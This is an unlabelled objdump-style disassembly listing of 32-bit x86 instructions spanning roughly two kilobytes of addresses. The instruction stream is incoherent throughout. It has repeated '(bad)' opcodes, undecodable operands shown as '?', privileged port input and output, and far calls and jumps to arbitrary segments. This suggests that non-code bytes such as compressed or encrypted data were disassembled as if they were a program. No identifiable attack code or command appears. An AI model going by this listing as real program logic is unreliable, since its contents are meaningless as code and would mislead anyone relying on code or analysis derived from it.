  5313bf:	imul   edi,DWORD PTR [ecx],0x44
  5313c2:	ror    ecx,cl
  5313c4:	mov    al,ds:0x54c7436
  5313c9:	pop    ecx
  5313ca:	cwde   
  5313cb:	popa   
  5313cc:	daa    
  5313cd:	into   
  5313ce:	cdq    
  5313cf:	sbb    eax,0xb06dcbda
  5313d4:	push   0xffffff97
  5313d6:	arpl   WORD PTR [ebp-0x4d],dx
  5313d9:	cmp    al,0x21
  5313db:	xlat   BYTE PTR ds:[ebx]
  5313dc:	ins    BYTE PTR es:[edi],dx
  5313dd:	mov    edi,0x6a4c2797
  5313e2:	fst    DWORD PTR [ebx-0x7c8ed30a]
  5313e8:	dec    ecx
  5313e9:	imul   ebp,DWORD PTR [ebp-0x3589483],0xffffffd4
  5313f0:	loope  0x531382
  5313f2:	mov    bh,0x95
  5313f4:	sbb    DWORD PTR [ebx],esi
  5313f6:	sbb    dh,BYTE PTR [esi+edi*8]
  5313f9:	iret   
  5313fa:	in     al,0x27
  5313fc:	adc    edx,DWORD PTR gs:[ecx+ebp*4+0x33]
  531401:	mov    edx,0x4340f137
  531406:	pop    ds
  531407:	xchg   ecx,eax
  531408:	add    BYTE PTR [ebx-0x42c53ed0],cl
  53140e:	dec    esi
  53140f:	mov    al,0x43
  531411:	sub    BYTE PTR [edx+ebx*1+0x1d4e51e4],cl
  531418:	call   0x83bd9c6a
  53141d:	rcr    DWORD PTR [esi-0x9],cl
  531420:	pop    ebp
  531421:	push   esp
  531422:	mov    BYTE PTR [ebp+0x3f],cl
  531425:	mov    dl,BYTE PTR [eax]
  531427:	outs   dx,BYTE PTR ds:[esi]
  531428:	int3   
  531429:	outs   dx,BYTE PTR ds:[esi]
  53142a:	call   DWORD PTR [eax]
  53142c:	test   BYTE PTR [eax],dh
  53142e:	ds stc 
  531430:	test   al,0xc
  531432:	iret   
  531433:	add    al,0x79
  531435:	sbb    dh,BYTE PTR [ebx+0x5b]
  531438:	aad    0x78
  53143a:	add    bl,BYTE PTR [eax]
  53143c:	aaa    
  53143d:	sub    eax,DWORD PTR [edx]
  53143f:	fs pop esp
  531441:	or     ebp,ebx
  531443:	push   ecx
  531444:	dec    ebx
  531445:	adc    eax,0x5b90f3ab
  53144a:	sbb    dl,cl
  53144c:	mov    ah,0x94
  53144e:	ins    DWORD PTR es:[edi],dx
  53144f:	(bad)  
  531451:	cdq    
  531452:	xor    esp,DWORD PTR [edi+0xb]
  531455:	add    DWORD PTR [edx+edx*4-0x69],esp
  531459:	inc    edx
  53145a:	mov    esp,0x5de20dae
  53145f:	mov    eax,0x6c4296e0
  531464:	les    ebx,FWORD PTR [edx]
  531466:	mov    ds:0xb58a20d,eax
  53146b:	repnz stos BYTE PTR es:[edi],al
  53146d:	scas   al,BYTE PTR es:[edi]
  53146e:	pop    ebx
  53146f:	fdivrp st(6),st
  531471:	jbe    0x531469
  531473:	xor    edx,eax
  531475:	inc    esp
  531476:	inc    edi
  531477:	fucomi st,st(0)
  531479:	mov    dh,0x2d
  53147b:	icebp  
  53147c:	mov    al,0x50
  53147e:	test   eax,0x33beeb73
  531483:	pop    ds
  531484:	mov    ds:0x8a39fdef,al
  531489:	mov    ds:0xcb735abd,eax
  53148e:	(bad)  
  53148f:	mov    al,0x8e
  531491:	push   ebp
  531492:	ins    BYTE PTR es:[edi],dx
  531493:	pop    eax
  531494:	mov    ebx,0x1918ef84
  531499:	cmp    al,0x39
  53149b:	cmp    bl,BYTE PTR es:[esi+ebx*2]
  53149f:	cld    
  5314a0:	ret    0x2ce8
  5314a3:	fs cwde 
  5314a5:	fisttp QWORD PTR [edx-0x4d2296a9]
  5314ab:	in     eax,0x84
  5314ad:	push   ds
  5314ae:	or     al,0xb4
  5314b0:	push   cs
  5314b1:	ret    
  5314b2:	mov    esp,ebp
  5314b4:	jg     0x531439
  5314b6:	repz scas eax,DWORD PTR es:[edi]
  5314b8:	or     eax,0x426cf813
  5314bd:	jno    0x531443
  5314bf:	inc    esp
  5314c0:	cld    
  5314c1:	ds xchg esi,eax
  5314c3:	mov    ebx,0x8f08c522
  5314c8:	rcr    ch,0xa0
  5314cb:	cdq    
  5314cc:	jl     0x53153c
  5314ce:	addr16 mov eax,0xf448486c
  5314d4:	sahf   
  5314d5:	inc    ebp
  5314d6:	xchg   cl,al
  5314d8:	pop    eax
  5314d9:	outs   dx,DWORD PTR ds:[esi]
  5314da:	sbb    eax,0x3ead08ca
  5314df:	call   0x86011277
  5314e4:	jns    0x53147d
  5314e6:	mov    edi,DWORD PTR [eax-0x6776c9f]
  5314ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5314ed:	and    ecx,DWORD PTR [edx-0x5f6f7056]
  5314f3:	pop    ebp
  5314f4:	call   DWORD PTR [ebx-0x7e]
  5314f7:	lock jl 0x5314e1
  5314fa:	ret    0xa8b1
  5314fd:	ret    0x6f18
  531500:	ds adc al,0x2e
  531503:	les    esi,FWORD PTR [ecx+eax*1-0x1d]
  531507:	lock test al,0x29
  53150a:	out    0x4a,eax
  53150c:	or     ah,BYTE PTR [ecx+edx*4-0x56bdfdd6]
  531513:	cmp    BYTE PTR ds:[eax],cl
  531516:	retf   
  531517:	pop    edx
  531518:	daa    
  531519:	cmp    BYTE PTR [ecx],cl
  53151b:	inc    esi
  53151c:	scas   al,BYTE PTR es:[edi]
  53151d:	mov    eax,ds:0x67d22d66
  531522:	add    ebx,edx
  531524:	rcl    DWORD PTR [eax-0x353b3161],1
  53152a:	imul   ebp,DWORD PTR [si+0x7515],0xffffffc9
  531530:	adc    ecx,DWORD PTR [esi+0x30]
  531533:	push   0xf4cf6e62
  531538:	sub    al,0x63
  53153a:	icebp  
  53153b:	in     al,dx
  53153c:	arpl   WORD PTR [esi+0x39552618],si
  531542:	add    eax,0x86a575c5
  531547:	fisttp WORD PTR [esi+0x50849077]
  53154d:	cwde   
  53154e:	imul   esi,DWORD PTR [edi],0xffffffbb
  531551:	dec    esp
  531552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531553:	fnstsw WORD PTR [eax]
  531555:	sub    bl,BYTE PTR [ecx-0x70]
  531558:	(bad)  
  531559:	repz pop esi
  53155b:	cmp    ecx,0x33
  53155e:	hlt    
  53155f:	shl    BYTE PTR [edi],cl
  531561:	fwait
  531562:	xor    ecx,DWORD PTR [edi+0x4d457530]
  531568:	mov    DWORD PTR [edx],esi
  53156a:	dec    ebp
  53156b:	in     al,dx
  53156c:	jle    0x531522
  53156e:	push   edi
  53156f:	and    dh,BYTE PTR [edi-0x363de4ee]
  531575:	fld    TBYTE PTR [ecx]
  531577:	int    0x94
  531579:	mov    al,ds:0xee8a7dfc
  53157e:	mov    edx,0x541ec19a
  531583:	xor    bh,BYTE PTR [edx-0x44f19b4e]
  531589:	punpckhwd mm7,QWORD PTR [esi-0x5b87a217]
  531590:	(bad)  
  531591:	inc    bp
  531593:	pop    esi
  531594:	aaa    
  531595:	add    ch,BYTE PTR [esi-0x7ea87bed]
  53159b:	stos   DWORD PTR es:[edi],eax
  53159c:	clc    
  53159d:	mov    dh,ah
  53159f:	inc    ebp
  5315a0:	cli    
  5315a1:	pop    ebp
  5315a2:	jns    0x5315c5
  5315a4:	daa    
  5315a5:	fnsave [esi]
  5315a7:	imul   ebp,ebp,0xd
  5315aa:	mov    al,0xb5
  5315ac:	div    DWORD PTR [edx+ebx*2+0x3ef8db6d]
  5315b3:	xchg   ecx,ebp
  5315b5:	mov    edi,0xd137eea7
  5315ba:	outs   dx,BYTE PTR ds:[esi]
  5315bb:	sar    BYTE PTR [ebx+0x77d9d45b],cl
  5315c1:	scas   al,BYTE PTR es:[edi]
  5315c2:	or     eax,0x5ecb11a7
  5315c7:	ins    BYTE PTR es:[edi],dx
  5315c8:	add    bl,cl
  5315ca:	sbb    edx,DWORD PTR [eax+0x51]
  5315cd:	jnp    0x53158d
  5315cf:	xchg   esi,eax
  5315d0:	or     bh,ch
  5315d2:	lea    edx,[esi+ecx*8-0x44]
  5315d6:	stc    
  5315d7:	dec    edi
  5315d8:	adc    al,0xba
  5315da:	dec    edi
  5315db:	data16 adc ah,BYTE PTR [ebp-0x22]
  5315df:	inc    eax
  5315e0:	mov    cl,0xd7
  5315e2:	loope  0x5315dd
  5315e4:	jae    0x531614
  5315e6:	stos   BYTE PTR es:[edi],al
  5315e7:	fwait
  5315e8:	stos   BYTE PTR es:[edi],al
  5315e9:	stos   DWORD PTR es:[edi],eax
  5315ea:	pop    esi
  5315eb:	pop    ecx
  5315ec:	jmp    FWORD PTR [edi]
  5315ee:	ret    
  5315ef:	fist   WORD PTR [ebp+0x707cc5a3]
  5315f5:	pop    ds
  5315f6:	xchg   ebp,eax
  5315f7:	dec    eax
  5315f8:	sub    DWORD PTR [edi],ebp
  5315fa:	sbb    dh,BYTE PTR [esi+0x3f]
  5315fd:	jmp    0xeb479cb9
  531602:	dec    ebp
  531603:	pop    eax
  531604:	std    
  531605:	in     al,dx
  531606:	out    dx,eax
  531607:	ret    
  531608:	pop    ecx
  531609:	not    DWORD PTR [ebp+0x33]
  53160c:	adc    al,0x27
  53160e:	lahf   
  53160f:	jge    0x531638
  531611:	outs   dx,BYTE PTR ds:[esi]
  531612:	call   0xcba9d150
  531617:	inc    edi
  531618:	ins    BYTE PTR es:[edi],dx
  531619:	je     0x5315f1
  53161b:	rcr    BYTE PTR [ecx],0xa6
  53161e:	leave  
  53161f:	mov    dh,0xc
  531621:	cdq    
  531622:	dec    edi
  531623:	push   0xffffffce
  531625:	fwait
  531626:	inc    DWORD PTR [edx]
  531628:	ret    
  531629:	jp     0x53167b
  53162b:	pop    ecx
  53162c:	mov    eax,ds:0x573c0764
  531631:	jno    0x5315c6
  531633:	push   eax
  531634:	pop    ecx
  531635:	jb     0x53162e
  531637:	call   0x318c:0xd362d3ec
  53163e:	popf   
  53163f:	int    0x21
  531641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531642:	inc    ebx
  531643:	or     DWORD PTR [eax],0x7a415182
  531649:	or     eax,0xd5699caa
  53164e:	cmp    esi,DWORD PTR [edx-0x3645fdf0]
  531654:	add    DWORD PTR [esi+0x3a05b80f],eax
  53165a:	add    DWORD PTR [esi-0x1c682b3e],esp
  531660:	sbb    DWORD PTR [eax],ecx
  531662:	icebp  
  531663:	push   ss
  531664:	iret   
  531665:	mov    bh,0xd1
  531667:	push   ebx
  531668:	addr16 aam 0x51
  53166b:	push   edx
  53166c:	mov    esi,0xc0177488
  531671:	mov    dl,0xf1
  531673:	inc    esp
  531674:	xor    ecx,DWORD PTR [esi+0x29]
  531677:	pop    edx
  531678:	xor    BYTE PTR [ebx-0x33],dh
  53167b:	or     DWORD PTR ds:0xe71ca55d,esp
  531681:	sbb    eax,DWORD PTR [edx+0x3a24faef]
  531687:	push   0x1eff1fe9
  53168c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53168d:	(bad)  
  53168e:	mov    edx,0x4fe33765
  531693:	mov    WORD PTR [ecx+0x15],ss
  531696:	test   BYTE PTR [edx+0x4f],bh
  531699:	xchg   ebp,eax
  53169a:	shr    esp,0x3f
  53169d:	xchg   ebp,eax
  53169e:	jmp    0x531646
  5316a0:	or     eax,0xa28880f5
  5316a5:	mov    DWORD PTR [ebx+0x32],edi
  5316a8:	sub    al,BYTE PTR [esi+edx*1+0x59]
  5316ac:	(bad)  
  5316ad:	adc    eax,0x59da9845
  5316b2:	mov    bl,0xe7
  5316b4:	dec    esi
  5316b5:	mov    esp,0x4594e4dd
  5316ba:	inc    esp
  5316bb:	popf   
  5316bc:	add    dh,BYTE PTR [ebx+0x7bf05ad0]
  5316c2:	loope  0x5316c5
  5316c4:	add    DWORD PTR [ecx-0x7c591087],0x8ff03abb
  5316ce:	fiadd  DWORD PTR [eax+0x246d1cb1]
  5316d4:	mov    bh,0x50
  5316d6:	leave  
  5316d7:	stos   DWORD PTR es:[edi],eax
  5316d8:	std    
  5316d9:	pop    edi
  5316da:	pop    edx
  5316db:	mov    esi,DWORD PTR [eax+0x27]
  5316de:	xor    DWORD PTR [ebp+0x35204d4b],edi
  5316e4:	in     al,0xcb
  5316e6:	and    BYTE PTR [esi+0x1a],bl
  5316e9:	mov    ch,0x32
  5316eb:	int3   
  5316ec:	ret    
  5316ed:	adc    eax,0x7f098168
  5316f2:	jmp    0x25c8:0x3b6edc74
  5316f9:	outs   dx,DWORD PTR ds:[esi]
  5316fa:	call   0xabc64c1b
  5316ff:	xchg   esi,eax
  531700:	loopne 0x53175e
  531702:	adc    eax,0x80a4f910
  531707:	sbb    DWORD PTR [ebp-0x76],ebx
  53170a:	mov    ah,0x13
  53170c:	aaa    
  53170d:	out    0x41,eax
  53170f:	push   esp
  531710:	int    0x24
  531712:	mov    cl,0x6
  531714:	fist   WORD PTR [ebx+0x32]
  531717:	les    edi,FWORD PTR [ebp-0x80]
  53171a:	mov    eax,0x51debb46
  53171f:	jo     0x53170e
  531721:	pop    es
  531722:	xchg   ebx,eax
  531723:	push   ecx
  531724:	dec    ebx
  531725:	(bad)  
  531726:	fbld   TBYTE PTR [eax]
  531728:	add    bl,BYTE PTR [ebx]
  53172a:	mov    ah,0x35
  53172c:	push   DWORD PTR [esi]
  53172e:	das    
  53172f:	popa   
  531730:	shl    BYTE PTR [esi-0x488f09b],1
  531736:	mov    esp,0x5513c474
  53173b:	jno    0x531722
  53173d:	and    eax,0xd82a0842
  531742:	dec    eax
  531743:	dec    ecx
  531744:	and    ebp,esi
  531746:	aad    0x6c
  531748:	bound  esi,QWORD PTR [eax-0x4dbb3da4]
  53174e:	or     bh,BYTE PTR [esi+0x7]
  531751:	out    0x97,eax
  531753:	xchg   ebp,eax
  531754:	mov    BYTE PTR [ecx+0x2dec742b],ah
  53175a:	add    cl,BYTE PTR [ebx]
  53175c:	inc    edx
  53175d:	pop    ds
  53175e:	xchg   ebx,eax
  53175f:	test   eax,0xab1524b6
  531764:	es aam 0xa1
  531767:	xchg   ebx,eax
  531768:	push   edi
  531769:	ret    
  53176a:	add    BYTE PTR ds:0x6babbe4f,0x82
  531771:	sbb    BYTE PTR [edx-0x41849f65],al
  531777:	test   bl,0xaf
  53177a:	out    dx,al
  53177b:	sbb    eax,0xb5389c02
  531780:	sub    bh,BYTE PTR [eax]
  531782:	call   0x3456:0xfc659ff5
  531789:	ins    DWORD PTR es:[edi],dx
  53178a:	ret    
  53178b:	inc    eax
  53178c:	or     al,0x11
  53178e:	mov    esi,0xe265964c
  531793:	xor    al,0x19
  531795:	adc    al,0x96
  531797:	pop    esp
  531798:	rol    DWORD PTR ds:0x6d722b29,0xa5
  53179f:	pusha  
  5317a0:	mov    dl,0xa4
  5317a2:	pop    es
  5317a3:	(bad)  
  5317a4:	sbb    dh,cl
  5317a6:	gs fs dec ebx
  5317a9:	add    BYTE PTR [eax-0x7b],cl
  5317ac:	xchg   esp,eax
  5317ad:	jae    0x53174b
  5317af:	push   ss
  5317b0:	xchg   esi,eax
  5317b1:	dec    ecx
  5317b2:	loop   0x531767
  5317b4:	ja     0x53180e
  5317b6:	mov    al,0x10
  5317b8:	pop    ebx
  5317b9:	jl     0x53175d
  5317bb:	mov    cs,WORD PTR [eax]
  5317bd:	inc    ebp
  5317be:	push   edi
  5317bf:	out    dx,al
  5317c0:	mov    esp,0xe1fedb81
  5317c5:	inc    eax
  5317c6:	pop    ebx
  5317c7:	or     esp,DWORD PTR [eax]
  5317c9:	sub    BYTE PTR [ebx],bl
  5317cb:	shl    BYTE PTR [ebp+0x7e],0x84
  5317cf:	cwde   
  5317d0:	int3   
  5317d1:	xor    bl,BYTE PTR ds:0xe1a6277
  5317d7:	jnp    0x5317f3
  5317d9:	mov    cl,0x60
  5317db:	sub    al,0xdb
  5317dd:	cli    
  5317de:	jo     0x53185c
  5317e0:	mov    ah,0xb3
  5317e2:	push   0x94f4cf0f
  5317e7:	bound  edx,QWORD PTR [ecx+0x4]
  5317ea:	sub    BYTE PTR [edi+edi*8-0x58757a85],0x8a
  5317f2:	mov    BYTE PTR [edx],cl
  5317f4:	mov    ah,BYTE PTR [ecx]
  5317f6:	and    eax,0x79451417
  5317fb:	loopne 0x5317bc
  5317fd:	sub    esi,ecx
  5317ff:	call   0xe63f:0x233e6699
  531806:	cmp    edx,eax
  531808:	pop    esi
  531809:	adc    eax,0x132df11c
  53180e:	popa   
  53180f:	arpl   WORD PTR [esp+eax*4],bp
  531812:	mov    ah,0x36
  531814:	popa   
  531815:	fnstenv [ecx]
  531817:	and    dl,ch
  531819:	aas    
  53181a:	add    ah,ah
  53181c:	xchg   ecx,eax
  53181d:	jbe    0x531882
  53181f:	sub    eax,0x7422aedb
  531824:	add    al,0x8f
  531826:	fsin   
  531828:	bound  edx,QWORD PTR [edi-0x9]
  53182b:	jmp    0x5a8fb395
  531830:	dec    ebx
  531831:	pushf  
  531832:	aaa    
  531833:	cli    
  531834:	dec    eax
  531835:	paddusb mm5,QWORD PTR [ecx]
  531838:	push   ebx
  531839:	xor    eax,0x9f4649e6
  53183e:	or     al,0x44
  531840:	into   
  531841:	in     al,0x68
  531843:	push   eax
  531844:	cmp    al,0x50
  531846:	xchg   DWORD PTR [ecx+0x19caf21d],eax
  53184c:	push   edi
  53184d:	xchg   ebx,eax
  53184e:	retf   0xfaa3
  531851:	hlt    
  531852:	jmp    DWORD PTR [ecx+0x31]
  531855:	pop    ebp
  531856:	jmp    0x531887
  531858:	xor    al,0x6
  53185a:	or     eax,0x6de790b9
  53185f:	bound  esi,QWORD PTR [ebx-0x315d0656]
  531865:	fidiv  DWORD PTR [esi+esi*4]
  531868:	jns    0x53181d
  53186a:	pop    eax
  53186b:	daa    
  53186c:	std    
  53186d:	test   al,0xb4
  53186f:	in     al,dx
  531870:	mov    DWORD PTR [edi],ecx
  531872:	and    BYTE PTR [ebx+0x841b1c3],cl
  531878:	in     eax,0x76
  53187a:	mov    ds:0xa3627150,al
  53187f:	sar    BYTE PTR [edi+eiz*4+0x746eb6d2],1
  531886:	fsubr  DWORD PTR [ecx-0x20de6cf0]
  53188c:	mov    eax,ds:0x9d81acae
  531891:	xchg   ecx,eax
  531892:	xchg   ecx,eax
  531893:	pop    edx
  531894:	sub    BYTE PTR [eax-0x6a],bl
  531897:	mov    fs,WORD PTR [ebp+eax*2-0x5a051c50]
  53189e:	gs jo  0x5318ca
  5318a1:	jl     0x5318d9
  5318a3:	iret   
  5318a4:	in     al,dx
  5318a5:	push   edi
  5318a6:	push   0x71
  5318a8:	call   0xd6cb1b24
  5318ad:	dec    eax
  5318ae:	inc    esi
  5318af:	add    DWORD PTR [eax+0x37],0xa7ed611e
  5318b6:	stos   DWORD PTR es:[edi],eax
  5318b7:	mov    bl,0xc1
  5318b9:	add    BYTE PTR [edi+0x534456c0],ah
  5318bf:	dec    edi
  5318c0:	sar    BYTE PTR [ebx-0x591fb365],0xfd
  5318c7:	aaa    
  5318c8:	mov    edx,0xc2c903c5
  5318cd:	fcom   DWORD PTR [edx+ebx*1]
  5318d0:	adc    esp,0xd358cded
  5318d6:	(bad)  
  5318d7:	test   al,0x82
  5318d9:	es jle 0x53195b
  5318dc:	adc    al,0xb0
  5318de:	and    dh,BYTE PTR [edi+0x7a193db5]
  5318e4:	out    dx,al
  5318e5:	inc    edi
  5318e6:	jp     0x53190c
  5318e8:	stos   BYTE PTR es:[edi],al
  5318e9:	push   0xceb6740b
  5318ee:	test   eax,0xc57a876f
  5318f3:	popf   
  5318f4:	adc    bh,al
  5318f6:	push   esp
  5318f7:	stc    
  5318f8:	es call 0xdeeb:0xb1b2ba07
  531900:	ins    BYTE PTR es:[edi],dx
  531901:	sbb    eax,0xa8f0b91e
  531906:	inc    esp
  531907:	cmc    
  531908:	stos   BYTE PTR es:[edi],al
  531909:	push   ebx
  53190a:	push   0xffffffcb
  53190c:	jl     0x531948
  53190e:	push   0x56567664
  531913:	pop    edx
  531914:	imul   edi,DWORD PTR [eax],0x3
  531917:	scas   al,BYTE PTR es:[edi]
  531918:	in     al,0x3
  53191a:	push   edi
  53191b:	xchg   ecx,eax
  53191c:	sub    dh,dl
  53191e:	and    edi,DWORD PTR [edx+0x55db2c3f]
  531924:	inc    edi
  531925:	cmp    ah,BYTE PTR [edi+eax*2-0x1a]
  531929:	sar    BYTE PTR [eax+0x3f],cl
  53192c:	imul   ebp,DWORD PTR [eax],0x37
  53192f:	mov    ?,WORD PTR [edi-0x8998597]
  531935:	sahf   
  531936:	ficom  WORD PTR [ecx+0x3f7ca68a]
  53193c:	test   eax,0x39b6dd20
  531941:	js     0x531917
  531943:	push   ebx
  531944:	adc    eax,0xc19d79c7
  531949:	(bad)  
  53194c:	mov    WORD PTR ss:[ecx-0x6129be67],?
  531953:	ins    BYTE PTR es:[edi],dx
  531954:	jbe    0x5319d1
  531956:	fcomi  st,st(3)
  531958:	sub    bl,BYTE PTR [ebp-0x3dcba757]
  53195e:	call   0x160c5180
  531963:	ins    BYTE PTR es:[edi],dx
  531964:	je     0x53190b
  531966:	adc    al,0xbf
  531968:	pop    ecx
  531969:	iret   
  53196a:	or     al,0xe6
  53196c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53196d:	loopne 0x5319e1
  53196f:	mov    ds:0x3bb47b7a,eax
  531974:	fisttp WORD PTR [ebx+0x4d21479b]
  53197a:	sbb    dl,BYTE PTR [ecx]
  53197c:	push   ecx
  53197d:	enter  0xda57,0x80
  531981:	lahf   
  531982:	add    al,0x64
  531984:	jb     0x531a02
  531986:	fst    st(3)
  531988:	mov    DWORD PTR [ebx],esp
  53198a:	push   edi
  53198b:	loope  0x53199f
  53198d:	sub    bh,BYTE PTR ds:0x5987d4a6
  531993:	scas   eax,DWORD PTR es:[edi]
  531994:	ins    DWORD PTR es:[edi],dx
  531995:	jg     0x5319a8
  531997:	jns    0x5319de
  531999:	xor    eax,0xbf3ea82e
  53199e:	ret    0x827e
  5319a1:	imul   edi,DWORD PTR [eax-0x28661698],0x36
  5319a8:	je     0x53195a
  5319aa:	mov    ?,WORD PTR [edi-0x55]
  5319ad:	jg     0x531937
  5319af:	cdq    
  5319b0:	and    bl,BYTE PTR [esp+edi*2-0x65]
  5319b4:	loope  0x5319a7
  5319b6:	mov    eax,ds:0x5af91930
  5319bb:	stos   BYTE PTR es:[edi],al
  5319bc:	cs or  eax,0x23f4f78f
  5319c2:	xchg   esp,eax
  5319c3:	cmp    esp,esp
  5319c5:	mov    ss,esi
  5319c7:	int    0xf6
  5319c9:	or     bh,BYTE PTR [esi-0x35]
  5319cc:	in     eax,dx
  5319cd:	pop    ecx
  5319ce:	dec    edi
  5319cf:	sar    al,0x38
  5319d2:	jl     0x531a3b
  5319d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5319d5:	jcxz   0x5319e6
  5319d8:	call   FWORD PTR [ecx-0x57]
  5319db:	mov    esi,0xfb49644a
  5319e0:	test   al,0x5d
  5319e2:	aad    0x8b
  5319e4:	mov    ebp,0x8216222f
  5319e9:	inc    ebx
  5319ea:	push   ebp
  5319eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5319ec:	in     al,0x89
  5319ee:	add    ch,dl
  5319f0:	or     bl,BYTE PTR [ecx-0x36]
  5319f3:	in     eax,dx
  5319f4:	push   edx
  5319f5:	xchg   edi,eax
  5319f6:	clc    
  5319f7:	jae    0x531a06
  5319f9:	jmp    0x9af1276e
  5319fe:	fdiv   DWORD PTR [ebp+0x2f8e4dbd]
  531a04:	add    ah,0x7d
  531a07:	and    al,cl
  531a09:	aad    0x5b
  531a0b:	in     al,0x68
  531a0d:	mov    edi,0x5a080b21
  531a12:	(bad)  
  531a14:	loop   0x531a13
  531a16:	call   0x6a9e:0x4951887c
  531a1d:	and    BYTE PTR [esi+0x6c],al
  531a20:	cwde   
  531a21:	cmp    ch,bh
  531a23:	sahf   
  531a24:	hlt    
  531a25:	pop    ebx
  531a26:	push   ds
  531a27:	std    
  531a28:	sub    cl,BYTE PTR [ecx]
  531a2a:	aas    
  531a2b:	mov    BYTE PTR [eax],bh
  531a2d:	mov    bl,0xa6
  531a2f:	iret   
  531a30:	inc    ebp
  531a31:	aam    0x43
  531a33:	jo     0x5319c3
  531a35:	lock inc ecx
  531a37:	(bad)  
  531a38:	stc    
  531a39:	adc    eax,0x5eb1221b
  531a3e:	xchg   ebx,eax
  531a3f:	shr    esi,cl
  531a41:	add    al,0xd
  531a43:	inc    ebp
  531a44:	jns    0x531a1b
  531a46:	fsub   QWORD PTR ds:0x1ba63f6b
  531a4c:	loopne 0x531ab1
  531a4e:	sub    edi,DWORD PTR [ebp+0x2a]
  531a51:	or     bl,ch
  531a53:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  531a55:	imul   eax,edx,0xa022db87
  531a5b:	daa    
  531a5c:	sbb    BYTE PTR [eax],0x5e
  531a5f:	jno    0x5319e3
  531a61:	pusha  
  531a62:	push   cs
  531a63:	lahf   
  531a64:	pushf  
  531a65:	add    BYTE PTR [eax],bh
  531a67:	jbe    0x531a25
  531a69:	call   0x10bd6e69
  531a6e:	stos   DWORD PTR es:[edi],eax
  531a6f:	push   cs
  531a70:	lea    esp,[esi]
  531a72:	call   0xe7af7047
  531a77:	mov    ds:0x1e1ddda9,al
  531a7c:	push   0xffffffa5
  531a7e:	test   edi,0xdd0cd83b
  531a84:	and    al,0x6d
  531a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  531a88:	add    al,0x1
  531a8a:	daa    
  531a8b:	(bad)  
  531a8c:	int    0x5e
  531a8e:	fnsave gs:[eax]
  531a91:	xchg   BYTE PTR [esi-0x75dadfbf],ah
  531a97:	lock cmp eax,0xdc21f62d
  531a9d:	ins    BYTE PTR es:[edi],dx
  531a9e:	push   edi
  531a9f:	dec    edx
  531aa0:	dec    ebp
  531aa1:	dec    eax
  531aa2:	daa    
  531aa3:	imul   ecx,edx,0xffffff8d
  531aa6:	ins    BYTE PTR es:[edi],dx
  531aa7:	cmc    
  531aa8:	jmp    0x1e01947d
  531aad:	out    dx,al
  531aae:	xor    BYTE PTR [ebp-0x172d2077],0x42
  531ab5:	neg    DWORD PTR [ebp-0x683d86da]
  531abb:	mov    ch,0xeb
  531abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531abe:	push   ecx
  531abf:	xor    al,0xb0
  531ac1:	pop    esi
  531ac2:	scas   al,BYTE PTR es:[edi]
  531ac3:	adc    eax,0x9a18838c
  531ac8:	cld    
  531ac9:	jg     0x531ab4
  531acb:	sbb    al,0xd6
  531acd:	enter  0x3c6f,0x4a
  531ad1:	jp     0x531af0
  531ad3:	pop    ecx
  531ad4:	add    ecx,DWORD PTR [esi-0x2a41ef98]
  531ada:	sub    DWORD PTR [esi],0xe3533878
  531ae0:	leave  
  531ae1:	cmp    ecx,DWORD PTR [ecx]
  531ae3:	nop
  531ae4:	cmp    BYTE PTR [edi-0x59],bl
  531ae7:	jle    0x531ae1
  531ae9:	scas   al,BYTE PTR es:[edi]
  531aea:	daa    
  531aeb:	pop    DWORD PTR [eax+0x1b]
  531aee:	jno    0x531b56
  531af0:	out    dx,al
  531af1:	mov    al,ds:0xdaad00c
  531af6:	mov    esi,0x9b9ec4c5
  531afb:	lods   eax,DWORD PTR ds:[esi]
  531afc:	mov    ch,0x25
  531afe:	xchg   edi,eax
  531aff:	pop    edi
  531b00:	or     DWORD PTR fs:[ebp-0x547152ba],ebx
  531b07:	jge    0x531b12
  531b09:	dec    esp
  531b0a:	test   DWORD PTR [eax],ebx
  531b0c:	mov    DWORD PTR [esi+ecx*2+0xeaec60d],esi
  531b13:	shl    DWORD PTR [ecx+0x29421e83],1
  531b19:	test   esi,0xca86b911
  531b1f:	adc    DWORD PTR [eax-0x66],ebp
  531b22:	push   eax
  531b23:	stos   DWORD PTR es:[edi],eax
  531b24:	cmc    
  531b25:	dec    eax
  531b26:	sbb    esp,DWORD PTR [ebx+0x5fe59960]
  531b2c:	shl    DWORD PTR [esi+0x2],0xb3
  531b30:	jmp    0xbf6b:0xe791c6e6
  531b37:	xor    eax,0xe206c42a
  531b3c:	push   ecx
  531b3d:	test   BYTE PTR [edi],bl
  531b3f:	and    BYTE PTR [ebx-0x232e5371],bl
  531b45:	xchg   ebp,eax
  531b46:	clc    
  531b47:	sub    cl,dh
  531b49:	fmul   DWORD PTR [esi+0x15]
  531b4c:	add    al,0xb5
  531b4e:	in     al,dx
  531b4f:	cmp    al,0x1c
  531b51:	mov    WORD PTR [edi-0x10],?
  531b54:	mov    ds:0xd9b302bc,al
  531b59:	cmp    eax,0x390d28b5
  531b5e:	js     0x531b58
  531b60:	add    DWORD PTR [ecx-0x2d],edi
  531b63:	fucomp st(6)
  531b65:	dec    ebx
  531b66:	shr    ch,0x96
  531b69:	sub    dh,ah
  531b6b:	arpl   WORD PTR [edx+0x18a3ded4],cx
  531b71:	dec    eax
  531b72:	sar    edi,1
  531b74:	js     0x531b98
  531b76:	bound  edx,QWORD PTR [edx-0x23b82c69]
  531b7c:	xchg   esi,eax
  531b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531b7e:	test   BYTE PTR [eax-0x80],bh
  531b81:	add    bl,BYTE PTR gs:[ebx+esi*1-0x1c5a880e]
  531b89:	jmp    0x16bc:0x857a2017
  531b90:	mov    ds:0x1cec16f2,eax
  531b95:	in     eax,dx
  531b96:	in     eax,0xad
  531b98:	dec    edi
  531b99:	xor    BYTE PTR [edi+edi*4+0x38],dh
  531b9d:	and    eax,0x27a765e8
  531ba2:	add    esi,ebp
  531ba4:	stos   BYTE PTR es:[edi],al
